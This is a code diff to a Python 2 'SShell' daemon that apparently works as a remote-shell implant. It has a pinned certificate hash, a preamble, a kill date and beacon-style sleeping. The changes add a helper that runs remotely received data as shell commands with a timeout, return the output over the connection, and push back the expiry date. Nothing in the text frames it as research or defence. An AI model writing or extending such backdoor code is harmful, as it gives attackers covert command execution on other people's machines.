@@ -8,7 +8,9 @@ import struct
 import sys
 import os
 import atexit
-from signal import SIGTERM 
+import signal
+from threading import Timer
+import shlex
 
 
 class Daemon(object):
@@ -112,7 +114,7 @@ class Daemon(object):
         # Try killing the daemon process    
         try:
             while 1:
-                os.kill(pid, SIGTERM)
+                os.kill(pid, signal.SIGTERM)
                 time.sleep(0.1)
         except OSError, err:
             err = str(err)
@@ -145,7 +147,7 @@ class SShell(Daemon):
     HOST = 'localhost'
     CERT_HASH = 'f146e9f45d116241e0dabf1cd25905fa28d16f53'
     PREAMBLE = '1010101010101010101010101010101010101010101010101010101010101011'
-    EXPIRE = '2016-01-01'  # yyyy-mm-dd
+    EXPIRE = '2016-06-01'  # yyyy-mm-dd
     SLEEPMAX = 3600
 
     def __init__(self, pid_file, verify=False):
@@ -153,11 +155,36 @@ class SShell(Daemon):
         self.seconds = 0
         self.verify = verify
 
+    @staticmethod
+    def _exec_timeout(commands, timeout_sec=10):
+        output = ' '
+        kill_process = lambda p: os.killpg(pgid, signal.SIGTERM)  # kill process group
+        process = subprocess.Popen(commands, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                   shell=True, preexec_fn=os.setsid)
+        pgid = os.getpgid(process.pid)
+        timer = Timer(timeout_sec, kill_process, [pgid])
+
+        try:
+            timer.start()
+            stdout, stderr = process.communicate()
+            if timer.isAlive() is False:
+                output = "Command timed out in {} seconds".format(timeout_sec)
+            else:
+                output = stdout + stderr
+            if output == '':
+                output = ' '
+            return output
+        except subprocess.CalledProcessError as e:
+            return "ERROR: CalledProcessError - {}".format(e)
+        except OSError as e:
+            return "ERROR: OSError - {}".format(e.args)
+        finally:
+            timer.cancel()
 
     @staticmethod
     def _exec(commands):
         try:
-            output = subprocess.check_output(commands, stderr=subprocess.STDOUT, shell=True)
+            output = subprocess.check_output(commands, stderr=subprocess.STDOUT)
             if output == '':
                 output = ' '
             return output
@@ -180,7 +207,7 @@ class SShell(Daemon):
                 time.sleep(int(duration) * 60)
                 return True
             else:
-                cmd_out = self._exec(data)
+                cmd_out = self._exec_timeout(data)
                 msg = struct.pack('>I', len(cmd_out)) + cmd_out
                 stream.write(msg)
 
